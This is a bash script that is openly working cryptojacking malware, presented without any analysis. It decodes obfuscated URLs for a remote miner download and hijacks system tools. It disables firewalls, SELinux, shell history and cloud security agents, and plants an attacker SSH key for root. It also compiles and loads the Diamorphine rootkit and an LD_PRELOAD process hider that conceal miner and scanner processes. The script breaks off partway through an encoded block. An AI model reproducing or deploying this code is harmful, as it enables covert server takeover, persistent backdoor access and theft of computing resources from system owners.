#!/bin/bash
#variables
domain=$(echo a2lzcy5hLWRvZy50b3AK|base64 -d)
mainurl=$(echo aHR0cDovL2tpc3MuYS1kb2cudG9wL2IyZjYyOAo=|base64 -d)
miner_url=$(echo aHR0cDovL2tpc3MuYS1kb2cudG9wL2IyZjYyOC9tL3htLnRhcgo=|base64 -d)
miner_url_backup=$(echo aHR0cDovL2tpc3MuYS1kb2cudG9wL2IyZjYyOC9tL3htLnRhcgo=|base64 -d)
proxyport=1414
#mv command
m_command(){
if [ -x /bin/chattr ];then
    mv /bin/chattr /bin/zzhcht
elif [ -x /usr/bin/chattr ];then
    mv /usr/bin/chattr /usr/bin/zzhcht
fi
if [ -x /bin/zzhcht ];then
    export CHATTR=/bin/zzhcht
elif [ -x /usr/bin/zzhcht ];then
    export CHATTR=/usr/bin/zzhcht
else
    export CHATTR=chattr
fi
for wcmd in  wget wge wd1 wget1 wdt wdz xget 
do
if [ -x "/bin/$wcmd" ];then
  ${CHATTR} -ia "/bin/$wcmd"
  export WGET_CMD="/bin/$wcmd"
  mv "/bin/$wcmd" /bin/wls  && export WGET_CMD="/bin/wls"  
elif [ -x "/usr/bin/$wcmd" ];then
  ${CHATTR} -ia "/usr/bin/$wcmd"
  export WGET_CMD="/usr/bin/$wcmd"
  mv "/usr/bin/$wcmd" /usr/bin/wls && export WGET_CMD="/usr/bin/wls"  
fi
done
for ccmd in curl cd1 cdz cur TNTcurl curltnt curl1 xcurl
do
if [ -x "/bin/$ccmd" ];then
  ${CHATTR} -ia "/bin/$ccmd"
  export CURL_CMD="/bin/$ccmd"
  mv "/bin/$ccmd" /bin/cls  && export CURL_CMD="/bin/cls" 
elif [ -x "/usr/bin/$ccmd" ];then
  ${CHATTR} -ia "/usr/bin/$ccmd"
  export CURL_CMD="/usr/bin/$ccmd"
  mv "/usr/bin/$ccmd" /usr/bin/cls && export CURL_CMD="/usr/bin/cls"  
fi
done
if [ -x "/bin/wls" ];then
    export WGET_CMD="/bin/wls"
elif [ -x "/usr/bin/wls" ];then
    export WGET_CMD="/usr/bin/wls"
else
    if [ $(command -v yum) ];then  
        rpm -e --nodeps wget 
        yum remove -y wget
        yum install -y wget  
    else
        apt-get remove -y wget
        apt-get install -y wget
    fi
    mv /bin/wget /bin/wls || mv /usr/bin/wget /usr/bin/wls
    if [ -f /bin/wls ];then
        export WGET_CMD="/bin/wls" 
    elif [ -f /usr/bin/wls ];then
        export WGET_CMD="/usr/bin/wls"
    fi  
fi
if [ -x "/usr/bin/cls" ];then
    export CURL_CMD="/usr/bin/cls"
elif [ -x "/bin/cls" ];then
    export CURL_CMD="/bin/cls"
else
    if [ $(command -v yum) ];then 
        rpm -e --nodeps curl
        yum remove curl
        yum install -y curl  
    else
        apt-get remove curl
        apt-get install -y  curl
    fi
    mv /bin/curl /bin/cls || mv /usr/bin/curl /usr/bin/cls
    if [ -f /bin/cls ];then
        export CURL_CMD="/bin/cls"
    elif [ -f /usr/bin/cls ];then
        export CURL_CMD="/usr/bin/cls"
    fi
fi

CSIZE=$(du -sk ${CURL_CMD}|awk '{print $1}')
WSIZE=$(du -sk ${WGET_CMD}|awk '{print $1}')
}

check_exist()
{
#try other way
if [ -x /usr/bin/netstat -o /bin/netstat ]
then
for pt in $(netstat -an|grep EST|grep "$proxyport"|awk '{print $5}'|awk -F ":" '{print $NF}')
do
   if [ "$pt" == "$proxyport" ];then
   echo "miner running"
   exit 1
   else
   echo "miner may not running,check next port"
   fi
done
else
        echo "haha"
fi
}

yum_ins()
{
	yum clean all
	for pkg in gcc make kmod net-tools "kernel-devel-uname-r == $(uname -r)"
	do
	yum install -y $pkg
	done
}
apk_ins()
{
	apk update
	for pkg in gcc make kmod  linux-headers net-tools
	do
	apk add $pkg
	done	
}
apt_ins()
{
	apt update --fix-missing
	for pkg in gcc make kmod net-tools linux-headers-$(uname -r)
	do
	apt-get install -y $pkg
	done	
}
ins_package()
{
	if 
		type apk 2>/dev/null 1>/dev/null;
	then 
		apk_ins
	fi
	if 
		type apt 2>/dev/null 1>/dev/null;
	then 
		apt_ins
	fi
	if 
		type yum 2>/dev/null 1>/dev/null;
	then 
		yum_ins
	fi		
}

env_set(){
iptables -F
systemctl stop firewalld 2>/dev/null 1>/dev/null
systemctl disable firewalld 2>/dev/null 1>/dev/null
service iptables stop 2>/dev/null 1>/dev/null
ulimit -n 65535 2>/dev/null 1>/dev/null
export LC_ALL=C 
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null
shopt -ou history 2>/dev/null 1>/dev/null
set +o history 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
setenforce 0 2>/dev/null 1>/dev/null
echo SELINUX=disabled >/etc/selinux/config 2>/dev/null
sudo sysctl kernel.nmi_watchdog=0
sysctl kernel.nmi_watchdog=0
echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
grep -q 8.8.8.8 /etc/resolv.conf || ${CHATTR} -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.8.8" >> /etc/resolv.conf;
grep -q 8.8.4.4 /etc/resolv.conf || ${CHATTR} -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.4.4" >> /etc/resolv.conf;
}

function clean_cron(){
	${CHATTR} -R -ia /var/spool/cron
	${CHATTR} -ia /etc/crontab
	${CHATTR} -R -ia /etc/cron.d
	${CHATTR} -R -ia /var/spool/cron/crontabs
	crontab -r
	rm -rf /var/spool/cron/*
	rm -rf /etc/cron.d/*
	rm -rf /var/spool/cron/crontabs
	echo'#test' > /etc/crontab
}
function lock_cron()
{
	${CHATTR} -R +ia /var/spool/cron
	${CHATTR} +ia /etc/crontab
	${CHATTR} -R +ia /var/spool/cron/crontabs
	${CHATTR} -R +ia /etc/cron.d
}

function makesshaxx(){
#优化
	echo "begin makessh"
	RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver"

	mkdir -p /root/.ssh/   
	touch /root/.ssh/authorized_keys  
	touch /root/.ssh/authorized_keys2
	chmod 600 /root/.ssh/authorized_keys
	chmod 600 /root/.ssh/authorized_keys2
	grep -q root@puppetserver /root/.ssh/authorized_keys || ${CHATTR} -ia /root/.ssh/authorized_keys; 
	grep -q root@puppetserver /root/.ssh/authorized_keys || echo $RSAKEY >> /root/.ssh/authorized_keys; ${CHATTR} +ia /root/.ssh/authorized_keys;
	grep -q root@puppetserver /root/.ssh/authorized_keys2 || ${CHATTR} -ia /root/.ssh/authorized_keys2; 
	grep -q root@puppetserver /root/.ssh/authorized_keys2 || echo $RSAKEY > /root/.ssh/authorized_keys2; ${CHATTR} +ia /root/.ssh/authorized_keys2;
}

hide_f(){
if [ -d "/usr/src/kernels/$(uname -r)/lib" ]
then 
  hi_home=${MOHOME}/..hide
  mkdir -p $hi_home
  if [ ! -d "$hi_home" ]; then mkdir -p $hi_home ; fi
  hf='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'
  echo $hf|base64 -d >$hi_home/hf.tar
  tar -xf $hi_home/hf.tar -C $hi_home/
  cd $hi_home/ 
  make
      if [ -f "$hi_home/diamorphine.ko" ]
      then 
       insmod diamorphine.ko
      else
      echo "dia hide false"
      fi
else
  echo "other hide method"
fi
}
exec_f(){
  for nhid in $(ps aux | grep -v grep | grep '/usr/share/\[cmake\]\|masscan' | awk '{print $2}')
   do
     kill -31  $nhid
   done
}

exec_hide(){
hi_home=/usr/share/..hide
if [ -f "$hi_home/diamorphine.ko" ]
then 
   echo "diamorphine loaded1"
   echo "hide diamorphine1"
   exec_f
else
    echo "diamorphine not loaded,execute load process"
    hide_f
    exec_f 
fi
}

exec_hide2(){
MOHOME=/usr/share
CHATTR=/bin/zzhcht
for BINARY_NAME in [cmake] pnscan masscan
do
H2P=${MOHOME}/..lph
if [ "$UID" = "0" ];then
LHB_MAKE='YWxsOiBsaWJwcm9jZXNzaGlkZXIuc28KCmxpYnByb2Nlc3NoaWRlci5zbzogcHJvY2Vzc2hpZGVyLmMKCWdjYyAtV2FsbCAtZlBJQyAtc2hhcmVkIC1vIGxpYnByb2Nlc3NoaWRlci5zbyBwcm9jZXNzaGlkZXIuYyAtbGRsCgouUEhPTlkgY2xlYW46CglybSAtZiBsaWJwcm9jZXNzaGlkZXIuc28KCg=='
PROCHIDE='I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxkbGZjbi5oPgojaW5jbHVkZSA8ZGlyZW50Lmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKLyoKICogRXZlcnkgcHJvY2VzcyB3aXRoIHRoaXMgbmFtZSB3aWxsIGJlIGV4Y2x1ZGVkCiAqLwpzdGF0aWMgY29uc3QgY2hhciogcHJvY2Vzc190b19maWx0ZXIgPSAiZXZpbF9zY3JpcHQucHkiOwoKLyoKICogR2V0IGEgZGlyZWN0b3J5IG5hbWUgZ2l2ZW4gYSBESVIqIGhhbmRsZQogKi8Kc3RhdGljIGludCBnZXRfZGlyX25hbWUoRElSKiBkaXJwLCBjaGFyKiBidWYsIHNpemVfdCBzaXplKQp7CiAgICBpbnQgZmQgPSBkaXJmZChkaXJwKTsKICAgIGlmKGZkID09IC0xKSB7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CgogICAgY2hhciB0bXBbNjRdOwogICAgc25wcmludGYodG1wLCBzaXplb2YodG1wKSwgIi9wcm9jL3NlbGYvZmQvJWQiLCBmZCk7CiAgICBzc2l6ZV90IHJldCA9IHJlYWRsaW5rKHRtcCwgYnVmLCBzaXplKTsKICAgIGlmKHJldCA9PSAtMSkgewogICAgICAgIHJldHVybiAwOwogICAgfQoKICAgIGJ1ZltyZXRdID0gMDsKICAgIHJldHVybiAxOwp9CgovKgogKiBHZXQgYSBwcm9jZXNzIG5hbWUgZ2l2ZW4gaXRzIHBpZAogKi8Kc3RhdGljIGludCBnZXRfcHJvY2Vzc19uYW1lKGNoYXIqIHBpZCwgY2hhciogYnVmKQp7CiAgICBpZihzdHJzcG4ocGlkLCAiMDEyMzQ1Njc4OSIpICE9IHN0cmxlbihwaWQpKSB7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CgogICAgY2hhciB0bXBbMjU2XTsKICAgIHNucHJpbnRmKHRtcCwgc2l6ZW9mKHRtcCksICIvcHJvYy8lcy9zdGF0IiwgcGlkKTsKIAogICAgRklMRSogZiA9IGZvcGVuKHRtcCwgInIiKTsKICAgIGlmKGYgPT0gTlVMTCkgewogICAgICAgIHJldHVybiAwOwogICAgfQoKICAgIGlmKGZnZXRzKHRtcCwgc2l6ZW9mKHRtcCksIGYpID09IE5VTEwpIHsKICAgICAgICBmY2xvc2UoZik7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CgogICAgZmNsb3NlKGYpOwoKICAgIGludCB1bnVzZWQ7CiAgICBzc2NhbmYodG1wLCAiJWQgKCVbXildcyIsICZ1bnVzZWQsIGJ1Zik7CiAgICByZXR1cm4gMTsKfQoKI2RlZmluZSBERUNMQVJFX1JFQURESVIoZGlyZW50LCByZWFkZGlyKSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXApzdGF0aWMgc3RydWN0IGRpcmVudCogKCpvcmlnaW5hbF8jI3JlYWRkaXIpKERJUiopID0gTlVMTDsgICAgICAgICAgICAgICBcCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKc3RydWN0IGRpcmVudCogcmVhZGRpcihESVIgKmRpcnApICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAp7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICBpZihvcmlnaW5hbF8jI3JlYWRkaXIgPT0gTlVMTCkgeyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgICAgICBvcmlnaW5hbF8jI3JlYWRkaXIgPSBkbHN5bShSVExEX05FWFQsICNyZWFkZGlyKTsgICAgICAgICAgICAgICBcCiAgICAgICAgaWYob3JpZ2luYWxfIyNyZWFkZGlyID09IE5VTEwpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgICAgICB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIkVycm9yIGluIGRsc3ltOiAlc1xuIiwgZGxlcnJvcigpKTsgICAgICAgICBcCiAgICAgICAgfSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgIH0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICBzdHJ1Y3QgZGlyZW50KiBkaXI7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgd2hpbGUoMSkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgICAgICBkaXIgPSBvcmlnaW5hbF8jI3JlYWRkaXIoZGlycCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgIGlmKGRpcikgeyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgICAgIGNoYXIgZGlyX25hbWVbMjU2XTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgICAgICAgICAgY2hhciBwcm9jZXNzX25hbWVbMjU2XTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgICAgICBpZihnZXRfZGlyX25hbWUoZGlycCwgZGlyX25hbWUsIHNpemVvZihkaXJfbmFtZSkpICYmICAgICAgICBcCiAgICAgICAgICAgICAgICBzdHJjbXAoZGlyX25hbWUsICIvcHJvYyIpID09IDAgJiYgICAgICAgICAgICAgICAgICAgICAgIFwKICAgICAgICAgICAgICAgIGdldF9wcm9jZXNzX25hbWUoZGlyLT5kX25hbWUsIHByb2Nlc3NfbmFtZSkgJiYgICAgICAgICAgXAogICAgICAgICAgICAgICAgc3RyY21wKHByb2Nlc3NfbmFtZSwgcHJvY2Vzc190b19maWx0ZXIpID09IDApIHsgICAgICAgICBcCiAgICAgICAgICAgICAgICBjb250aW51ZTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgICAgICAgICAgfSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgIH0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgYnJlYWs7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgIH0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgcmV0dXJuIGRpcjsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCn0KCkRFQ0xBUkVfUkVBRERJUihkaXJlbnQ2NCwgcmVhZGRpcjY0KTsKREVDTEFSRV9SRUFERElSKGRpcmVudCwgcmVhZGRpcik7Cgo='
mkdir -p ${H2P} 2>/dev/null
echo $LHB_MAKE | base64 -d > ${H2P}/Makefile
echo $PROCHIDE | base64 -d > ${H2P}/processhider.c
sed -i 's/evil_script.py/'$BINARY_NAME'/g' ${H2P}/processhider.c
cd ${H2P}
make 2>/dev/null 1>/dev/null
${CHATTR} -ia / /etc/ /etc/ld.so.preload /usr/ /usr/local/ /usr/local/lib/ 2>/dev/null 1>/dev/null
cp ${H2P}/libprocesshider.so /usr/local/lib/$BINARY_NAME.so 2>/dev/null
#rm -fr ${H2P} 2>/dev/null 1>/dev/null
${CHATTR} +i /usr/local/lib/$BINARY_NAME.so
if [ ! -f "/etc/ld.so.preload" ]; then touch /etc/ld.so.preload; fi
if [ -f /usr/local/lib/$BINARY_NAME.so ]; then  grep -q "$BINARY_NAME" /etc/ld.so.preload || echo '/usr/local/lib/'$BINARY_NAME'.so' >> /etc/ld.so.preload;fi
${CHATTR} +i /etc/ld.so.preload 
fi
done
}


clean_monitor()
{
if type systemctl 2>/dev/null 1>/dev/null; then systemctl stop apparmor 2>/dev/null 1>/dev/null ; systemctl disable apparmor 2>/dev/null 1>/dev/null ; else service apparmor stop 2>/dev/null 1>/dev/null ; fi
if type systemctl 2>/dev/null 1>/dev/null; then systemctl stop aliyun.service 2>/dev/null 1>/dev/null ; systemctl disable aliyun.service 2>/dev/null 1>/dev/null ; else service aliyun.service stop 2>/dev/null 1>/dev/null ; fi
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 % 2>/dev/null 1>/dev/null
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 % 2>/dev/null 1>/dev/null
if [ -d "/usr/local/aegis/" ]; then rm -rf /usr/local/aegis 2>/dev/null 1>/dev/null ; fi
if type ufw 2>/dev/null 1>/dev/null; then ufw disable 2>/dev/null 1>/dev/null ; fi
if type iptables 2>/dev/null 1>/dev/null; then iptables -F 2>/dev/null 1>/dev/null ; fi
sysctl kernel.nmi_watchdog=0 2>/dev/null 1>/dev/null
if [ -f "/proc/sys/kernel/nmi_watchdog" ]; then echo '0' >/proc/sys/kernel/nmi_watchdog 2>/dev/null ; fi
if [ -f "/etc/sysctl.conf" ]; then echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf 2>/dev/null ; fi
if ps aux | grep -i '[a]liyun' 2>/dev/null 1>/dev/null; then
	  echo 'IyEvYmluL2Jhc2gKCkFFR0lTX0lOU1RBTExfRElSPSIvdXNyL2xvY2FsL2FlZ2lzIgojY2hlY2sgbGludXggR2VudG9vIG9zIAp2YXI9YGxzYl9yZWxlYXNlIC1hIHwgZ3JlcCBHZW50b29gCmlmIFsgLXogIiR7dmFyfSIgXTsgdGhlbiAKCXZhcj1gY2F0IC9ldGMvaXNzdWUgfCBncmVwIEdlbnRvb2AKZmkKY2hlY2tDb3Jlb3M9YGNhdCAvZXRjL29zLXJlbGVhc2UgMj4vZGV2L251bGwgfCBncmVwIGNvcmVvc2AKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbGlmIFsgLWYgIi9ldGMvb3MtcmVsZWFzZSIgLWEgLW4gIiR7Y2hlY2tDb3Jlb3N9IiBdOyB0aGVuCglMSU5VWF9SRUxFQVNFPSJDT1JFT1MiCglBRUdJU19JTlNUQUxMX0RJUj0iL29wdC9hZWdpcyIKZWxzZSAKCUxJTlVYX1JFTEVBU0U9Ik9USEVSIgpmaQkJCgpzdG9wX2FlZ2lzX3BraWxsKCl7CiAgICBwa2lsbCAtOSBBbGlZdW5EdW4gPi9kZXYvbnVsbCAyPiYxCiAgICBwa2lsbCAtOSBBbGlIaWRzID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpSGlwcyA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaU5ldCA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaVNlY0d1YXJkID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpWXVuRHVuVXBkYXRlID4vZGV2L251bGwgMj4mMQogICAgCiAgICAvdXNyL2xvY2FsL2FlZ2lzL0FsaU5ldC9BbGlOZXQgLS1zdG9wZHJpdmVyCiAgICAvdXNyL2xvY2FsL2FlZ2lzL2FsaWhpcHMvQWxpSGlwcyAtLXN0b3Bkcml2ZXIKICAgIC91c3IvbG9jYWwvYWVnaXMvQWxpU2VjR3VhcmQvQWxpU2VjR3VhcmQgLS1zdG9wZHJpdmVyCiAgICBwcmludGYgIiUtNDBzICU0MHNcbiIgIlN0b3BwaW5nIGFlZ2lzIiAiWyAgT0sgIF0iCn0KCiMgY2FuIG5vdCByZW1vdmUgYWxsIGFlZ2lzIGZvbGRlciwgYmVjYXVzZSB0aGVyZSBpcyBiYWNrdXAgZmlsZSBpbiBnbG9iYWxjZmcK